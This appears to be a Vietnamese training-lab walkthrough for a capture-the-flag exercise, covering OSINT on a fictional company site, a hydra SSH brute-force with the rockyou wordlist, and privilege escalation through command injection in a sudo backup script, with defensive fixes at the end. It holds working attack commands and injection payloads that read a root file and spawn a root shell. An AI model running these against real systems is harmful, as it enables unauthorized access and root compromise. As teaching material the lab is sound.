# 🔓 Flow Khai Thác Lab SSH Bruteforce

## 📋 Tổng Quan

Flow này mô tả các bước khai thác và nguyên nhân của từng hành động trong lab SSH Bruteforce Attack.

---

## 🚀 Khởi Động Lab

Lab này sử dụng **dynamic flags** được generate tự động dựa trên:
- Ngày hiện tại (GMT+7 timezone)
- Email environment variable

### Cách 1: Sử dụng email mặc định (carl@techvision.com)
```bash
docker compose up -d
```

### Cách 2: Sử dụng email tùy chỉnh (ví dụ: cho sinh viên)
```bash
EMAIL=sinhvien@fpt.com docker compose up -d
```

**Lưu ý quan trọng:**
- Mỗi lần thay đổi EMAIL phải **rebuild container**:
  ```bash
  docker compose down
  EMAIL=sinhvien@fpt.com docker compose up -d --build
  ```
- Flag sẽ khác nhau mỗi ngày và mỗi email
- Để kiểm tra flag hiện tại, xem file `FLAG_GENERATION.md`

**Ví dụ tính flag với email tùy chỉnh:**
```bash
# Flag #1 với sinhvien@fpt.com ngày 05/12/2025:
echo -n "05122025_sinhvien@fpt.com_ssh_bruteforce" | sha1sum
# Output: FLAG{hash_value}

# Flag #2 với sinhvien@fpt.com ngày 05/12/2025:
echo -n "05122025_sinhvien@fpt.com_privesc_root" | sha1sum
# Output: FLAG{hash_value}
```

---

## 🎯 Flow Khai Thác

### 1. Khởi động lab và truy cập client container
**(Nguyên nhân: Cần môi trường attacker với các công cụ sẵn có)**

**Xem hướng dẫn chi tiết phía trên** trong phần "🚀 Khởi Động Lab" để chọn cách khởi động phù hợp.

Sau khi đã khởi động lab, truy cập client container:
```bash
docker exec -it bruteforce_client bash
```

**Kết quả:** Banner hiển thị Victim IP và Hostname

### 2. Thu thập thông tin từ website công ty (OSINT)
**(Nguyên nhân: Website công ty chứa thông tin công khai về nhân sự, có thể dùng để xác định target)**
```bash
curl http://ssh-target
```

**Kết quả:** Tìm thấy thông tin CTO Carl với email `carl@techvision.com`

### 3. Phân tích và chọn target
**(Nguyên nhân: CTO là technical role, có khả năng cao có SSH access để quản lý infrastructure)**
- Chairman: Business role → Khả năng SSH thấp
- CEO: Executive role → Khả năng SSH trung bình  
- **CTO: Technical role → Khả năng SSH cao** ⭐

**Quyết định:** Target = Carl (CTO)

### 4. Xác định username từ email
**(Nguyên nhân: Email prefix thường trùng với username trong hệ thống)**
```
Email: carl@techvision.com
       ^^^^
       username pattern
```

**Username:** `carl` (email prefix)

### 5. Tải và giải nén wordlist rockyou cho bruteforce
**(Nguyên nhân: Rockyou là wordlist phổ biến chứa hàng triệu passwords thực tế bị leak, có khả năng cao chứa password yếu)**
```bash
# Tải rockyou.txt.gz từ weakpass.com
wget https://weakpass.com/download/90/rockyou.txt.gz -O /tmp/rockyou.txt.gz

# Giải nén file
gunzip /tmp/rockyou.txt.gz


```

**Lưu ý:** Rockyou wordlist rất lớn (>14 triệu passwords), có thể mất thời gian. Password `password1` nằm trong wordlist này.

### 6. Xác định địa chỉ SSH server
**(Nguyên nhân: Cần biết IP/hostname của SSH server để tấn công)**
```bash
# Resolve IP từ hostname
getent hosts ssh-target

# Hoặc scan trực tiếp
nmap -p 22 ssh-target
```

**Kết quả:** SSH server tại `ssh-target:22`

### 7. Thực hiện bruteforce attack với Hydra
**(Nguyên nhân: SSH server cho phép password authentication, không có rate limiting hoặc fail2ban)**
```bash
hydra -l carl -P /tmp/rockyou.txt ssh://ssh-target -t 4
```

**Kết quả:** Tìm thấy password `password1`

**Nguyên nhân thành công:**
- SSH cho phép password authentication (`PasswordAuthentication yes`)
- Password yếu (`password1` - password rất phổ biến)
- Không có rate limiting hoặc fail2ban
- Wordlist chứa password đúng

### 8. SSH login với credentials tìm được
**(Nguyên nhân: Đã có username và password hợp lệ từ bruteforce)**
```bash
ssh carl@ssh-target
# Password: password1
```

**Kết quả:** Đăng nhập thành công với quyền user `carl`

### 9. Đọc flag đầu tiên
**(Nguyên nhân: Flag có permissions 600 - chỉ owner đọc được, đã có quyền của user carl)**
```bash
cat /home/carl/flag.txt
```

**Kết quả:** `FLAG{<sha1_hash>}` (Flag được generate tự động mỗi ngày dựa trên ngày GMT+7 và email)

### 10. Kiểm tra quyền sudo
**(Nguyên nhân: Sau khi có initial access, cần kiểm tra khả năng privilege escalation)**
```bash
sudo -l
```

**Kết quả:** User carl có thể chạy `` với sudo (NOPASSWD)

### 11. Phân tích script backup.sh
**(Nguyên nhân: Script có sudo access, cần tìm vulnerability để leo quyền)**
```bash
cat /usr/local/bin/backup.sh
```

**Kết quả:** Script sử dụng `eval "cat $FILENAME"` - **Command Injection vulnerability!**

**Nguyên nhân lỗ hổng:**
- Sử dụng `eval` với user input không được sanitize
- Không validate input trước khi execute

### 12. Khai thác command injection để đọc root flag
**(Nguyên nhân: eval execute code, có thể inject commands với dấu `;` để chạy lệnh khác)**
```bash
sudo /usr/local/bin/backup.sh "/etc/hosts; cat /root/root_flag.txt"
```

**Kết quả:** `FLAG{<sha1_hash>}` (Root flag được generate tự động mỗi ngày dựa trên ngày GMT+7 và email)

### 13. (Tùy chọn) Spawn root shell
**(Nguyên nhân: Có thể inject command để spawn shell với quyền root)**
```bash
sudo /usr/local/bin/backup.sh "/etc/hosts; /bin/bash"
```

**Kết quả:** Có root shell

---

## 🔍 Tóm Tắt Nguyên Nhân Lỗ Hổng

| Hành Động | Nguyên Nhân |
|-----------|-------------|
| **OSINT thành công** | Website công ty công khai thông tin nhân sự |
| **Xác định target đúng** | CTO = technical role → có SSH access |
| **Username dễ đoán** | Email prefix = username (pattern phổ biến) |
| **Bruteforce thành công** | Password yếu (`password1`) + không có rate limiting |
| **SSH password auth enabled** | `PasswordAuthentication yes` trong sshd_config |
| **Không có fail2ban** | Không có cơ chế chặn sau nhiều failed attempts |
| **Sudo misconfiguration** | User có sudo access đến script với NOPASSWD |
| **Command injection** | Script sử dụng `eval` với user input không sanitize |
| **Privilege escalation** | Command injection cho phép execute code với quyền root |

---

## ⚠️ Các Lỗ Hổng Chính

1. **Weak password** → Password dễ đoán (`password1`)
2. **SSH password authentication enabled** → Cho phép bruteforce
3. **Không có rate limiting/fail2ban** → Không chặn bruteforce attempts
4. **Sudo misconfiguration** → NOPASSWD cho script với user input
5. **Command injection trong backup.sh** → `eval` với unsanitized input
6. **Thông tin công khai (OSINT)** → Website tiết lộ thông tin nhân sự

---

## 🛡️ Cách Phòng Chống

1. ✅ **Sử dụng strong passwords** → `B@rc3!0n@#2024$Tx9` thay vì `password1`
2. ✅ **Disable password authentication** → Chỉ dùng SSH keys (`PasswordAuthentication no`)
3. ✅ **Cài đặt fail2ban** → Auto-ban sau 3-5 failed attempts
4. ✅ **Rate limiting** → Giới hạn số kết nối từ một IP
5. ✅ **Đổi SSH port** → Không dùng port 22 mặc định
6. ✅ **2FA/MFA** → Thêm lớp bảo mật thứ hai
7. ✅ **Sudo hardening** → Không dùng NOPASSWD, hoặc chỉ cho specific commands an toàn
8. ✅ **Input validation** → Không dùng `eval`, validate input trước khi execute
9. ✅ **Principle of least privilege** → Không cho user thường sudo access
10. ✅ **OSINT protection** → Hạn chế thông tin công khai về nhân sự

---

**Flow này minh họa cách kết hợp OSINT, bruteforce attack và privilege escalation để đạt được mục tiêu cuối cùng: root access và đọc được cả 2 flags.**
